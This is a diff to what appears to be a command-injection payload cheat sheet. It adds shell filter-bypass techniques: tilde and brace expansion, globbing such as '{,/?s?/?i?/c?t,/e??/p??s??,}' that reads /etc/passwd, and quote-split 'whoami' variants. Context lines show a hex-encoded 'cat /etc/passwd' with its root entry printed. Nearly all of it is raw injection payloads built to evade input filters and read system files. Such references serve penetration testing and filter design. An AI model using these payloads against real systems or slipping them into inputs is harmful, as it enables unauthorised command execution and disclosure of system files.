@@ -15,6 +15,9 @@
   * [Bypass with a line return](#bypass-with-a-line-return)
   * [Bypass with backslash newline](#bypass-with-backslash-newline)
   * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
+  * [Bypass with Tilde expansion](#bypass-with-tilde-expansion)
+  * [Bypass with Brace expansion](#bypass-with-brace-expansion)
+  * [Bypass characters filter](#bypass-characters-filter)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
    * [Bypass with double quote](#bypass-with-double-quote)
@@ -217,6 +220,25 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
+### Bypass with Tilde expansion
+
+```powershell
+echo ~+
+echo ~-
+```
+
+### Bypass with Brace expansion
+
+```powershell
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+```
+
 
 ### Bypass characters filter
 
@@ -247,6 +269,7 @@ root:x:0:0:root:/root:/bin/bash
 ```powershell
 w'h'o'am'i
 wh''oami
+'w'hoami
 ```
 
 #### Bypass with double quote
@@ -254,6 +277,7 @@ wh''oami
 ```powershell
 w"h"o"am"i
 wh""oami
+"wh"oami
 ```
 
 #### Bypass with backticks
